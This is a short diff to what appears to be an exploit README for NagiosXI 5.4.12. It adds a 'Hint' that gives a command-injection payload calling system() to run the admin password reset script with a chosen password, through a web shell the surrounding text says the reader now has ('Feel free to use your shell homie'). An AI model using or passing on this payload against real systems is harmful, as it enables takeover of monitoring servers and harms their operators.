@@ -31,6 +31,11 @@ After this query you can access your shell like this (example: *your_host*/nagio
 
 ![de way](https://camo.githubusercontent.com/8fe9aa429048d68def13737b28630f7a2adb3657/68747470733a2f2f696d6167652e70726e747363722e636f6d2f696d6167652f6f75494f535f4570547857516b6b346c4f6e446f66772e706e67)
 
+<details>
+  <summary>Hint: How to change admin password</summary>
+  _cmd=system(/usr/local/nagiosxi/scripts/reset_nagiosadmin_password.php --password=qwerty
+</details>
+
 ## Feel free to use your shell homie. ##
 
 research was made on NagiosXI 5.4.12
